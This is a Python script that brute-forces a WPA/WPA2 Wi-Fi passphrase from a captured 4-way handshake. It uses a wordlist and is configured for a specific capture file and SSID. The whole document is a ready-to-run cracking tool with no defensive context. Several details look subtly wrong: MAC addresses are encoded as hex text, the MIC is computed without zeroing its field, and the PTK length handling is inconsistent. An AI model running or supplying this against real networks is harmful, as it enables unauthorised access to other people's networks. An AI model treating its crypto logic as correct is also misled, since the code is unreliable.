import hashlib
import hmac
import binascii
from pbkdf2 import PBKDF2
from scapy.all import rdpcap, EAPOL

# Define HMAC-SHA1 function
def hmac_sha1(key, data):
    return hmac.new(key, data, hashlib.sha1).digest()

# Read handshake from PCAP file
def extract_handshake(pcap_file):
    packets = rdpcap(pcap_file)
    handshake = []
    
    for packet in packets:
        if packet.haslayer(EAPOL):
            handshake.append(packet)
    
    if len(handshake) < 3:
        raise ValueError("Incomplete 4-way handshake detected!")
    
    return handshake

# Derive PMK from passphrase
def derive_pmk(ssid, passphrase):
    return PBKDF2(passphrase, ssid.encode(), 4096).read(32)

# Derive PTK
def derive_ptk(pmk, anonce, snonce, ap_mac, client_mac):
    pke = b"Pairwise key expansion"
    sorted_macs = min(ap_mac, client_mac) + max(ap_mac, client_mac)
    sorted_nonces = min(anonce, snonce) + max(anonce, snonce)
    
    data = pke + sorted_macs + sorted_nonces
    ptk = b''
    
    for i in range(4):  # PTK is 64 bytes
        ptk += hmac_sha1(pmk, data + bytes([i]))
    
    return ptk[:48]  # PTK length

# Extract MIC and compare
def verify_mic(ptk, mic, eapol_frame):
    # MIC is the first 16 bytes of the first key in PTK
    computed_mic = hmac_sha1(ptk[:16], eapol_frame)[:16]
    
    return computed_mic == mic

# Brute force PSK with a wordlist
def brute_force_psk(ssid, handshake, wordlist_file):
    anonce = handshake[0].getlayer(EAPOL).nonce
    snonce = handshake[1].getlayer(EAPOL).nonce
    ap_mac = handshake[0].addr2.replace(":", "").encode()
    client_mac = handshake[1].addr1.replace(":", "").encode()
    mic = handshake[2].getlayer(EAPOL).wpa_key_mic

    with open(wordlist_file, "r") as wordlist:
        for passphrase in wordlist:
            passphrase = passphrase.strip()
            pmk = derive_pmk(ssid, passphrase)
            ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)
            
            if verify_mic(ptk, mic, handshake[2].getlayer(EAPOL).load):
                print(f"[+] Found PSK: {passphrase}")
                return passphrase
    
    print("[-] PSK not found in wordlist.")
    return None

# Run extraction
pcap_file = "Shak.cap"
ssid = "PEKLO"
wordlist = "pwd.txt"

handshake = extract_handshake(pcap_file)
psk = brute_force_psk(ssid, handshake, wordlist)
